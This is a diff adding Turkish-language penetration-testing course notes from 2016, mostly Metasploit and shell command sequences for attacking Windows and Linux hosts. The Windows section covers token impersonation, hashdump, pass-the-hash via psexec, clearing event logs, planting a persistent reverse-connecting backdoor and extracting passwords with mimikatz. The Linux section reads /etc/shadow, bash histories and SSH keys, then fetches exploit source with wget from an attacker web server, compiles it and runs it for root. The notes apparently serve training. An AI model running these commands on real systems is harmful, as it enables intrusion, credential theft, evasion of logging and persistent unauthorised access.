@@ -1,0 +1,85 @@
+---15/08/2016---
+
+-Karıştırılan kavramlar: encryption, encoding, hashing
+-Encryption: Şifreleme
+-Encoding: Fotoğraf vs. gibi dosyaları makine diline çevirme işlemi, dönüştürücülük yapma işlemi.
+-Hashing: Bir verinin kendisine özel geri döndürülemez bir çıktısıdır. Bu çıktı sayesinde aktarılan verinin bütünlüğü kontrol edilir.
+
+---Post-Exploitation(Windows):
+
+-Bu süreç hedefe sızdıktan sonra yapılacak her şeyi kapsar.
+
+---Pass the Hash Saldırısı: Hash'ine sahip olduğumuz şifreyi, şifreyi bilmeden diğer makinelere erişim için kullanabiliriz.
+
+~~> exploit
+M> getuid
+M> use incognito
+M> list_tokens -u (atlayabileceğimiz kullanıcıları listeler)
+M> impersonate_token XPTESTMACHINA\\rpdtest
+M> getuid
+M> getsystem
+M> run post/windows/gather/enum_applications (makinede yüklü programları tespit eder)
+M> background
+~~> search skype
+~~> sessions -i 3
+M> run post/windows/gather/credentials/skype (eğer skype servisi yüklüyse skype'den bilgi çekmek için kullanılabilecek bir post-exploitation)
+M> getsystem 
+M> hashdump (kullanıcı şifrelerinin hash'lerini çeker)
+M> background
+~~> use exploit/windows/smb/psexec
+~~> set rhost 192.168.20.10
+~~> set SMBUSER test
+~~> set SMBpass "hashdump ile elde ettiğimiz hash"
+~~> exploit
+
+~~> sessions -K (tüm session'ları kapatır)
+
+---Advanced komutlar:
+
+M> clearev (arkamızda bıraktığımız log'ları temizler)
+M> ps aux (sistemdeki process'leri listeler)
+M> migrate PID
+M> run persistence -A -i 10 -p 6767 -r 192.168.0.24 (Sistem bize belli süre aralıklarında bağlantı isteği gönderir, bu sayede sızdığımız sistemde bir backdoor(arka kapı) bırakmış oluruz ve bu isteklerden birini yakalayarak tekrar sisteme sızabiliriz)
+ 
+~> use exploit/multi/handler
+~~> set payload windows/meterpreter/reverse_tcp
+~~> set lhost 192.168.0.24
+~~> exploit
+M> load mimikatz (mimikatz: RAM'de kayıtlı şifreleri gösterir)
+M> help mimikatz
+M> mimikatz_command -f sekurlsa::searchPasswords
+
+---Pivoting: 
+
+-Sızdığımız makinenin bağlı olduğu ağa bağlı olan diğer makinelere, sızdığımız makineyi router olarak kullanıp atlama işlemine Pivoting denir. (Sızdığımız makinede ipconfig komutunu çalıştırırsak başka ağlara bağlı olup olmadığını görebiliriz.)
+
+M> run autoroute -s 172.16.0.0/16 (172.16.0.0/16 ip'ye sahip bir interface, sızdığımız makineyle bağlantılı olsaydı pivoting işlemi yapabilmemiz için sızdığımız makineyi router olarak conf. etmemizi sağlayan komut)
+
+---Post-Exploitation(Linux):
+
+=> cat /etc/issue (işletim sistemini öğrenir)
+=> cat /etc/passwd (içeride tanımlı olan kullanıcıları ve bu kullanıcıların yetkilerini listeler, kullanıcı isimlerini tespit ederek brute force yapabiliriz)
+=> cat /etc/shadow (sistemdeki kullanıcı şifrelerinin hash'lenmiş halinin bulunduğu dosya)
+=> /home/osman/.bash_history (Osman'ın çalıştırdığı bütün komutlar burada kayıt edilir)
+=> cat /root/.bash_history
+=> uname -a (İşletim sistemini görüntüler, kullanılan işletim sistemine ait bir exploit olabilir.)
+=> id (kim olduğumuzu ve hangi yetkilere sahip olduğumuzu gösterir)
+=> /home/user/.ssh (ssh key'lerinin bulunduğu dizin)
+=> ssh osman@192.168.99.100 (192.168.99.100 adresine ssh isteği yollar)
+=> crontab -l (zamanlanmış görevleri listeler. sistemde backdoor bırakmak için kullanılabilir)
+=> w (sistemle erişim halinde olan kullanıcıları listeler)
+
+---Mola 15dk---
+
+-tmp dizini (RAM mantığıyla çalışan bir dizin)
+
+---Yetki yükseltme saldırısı:
+
+=>(Desktop) phython -m SimpleHTTPServer 8989 (8989 portumuzda bir web server ayağa kaldırıyoruz)
+---Hedef makine: 
+=> cd /tmp
+=> wget http://192.168.0.24:8989/local.c
+=> gcc local.c -o exploit
+=> chmod +x exploit
+=> ./exploit
+# id
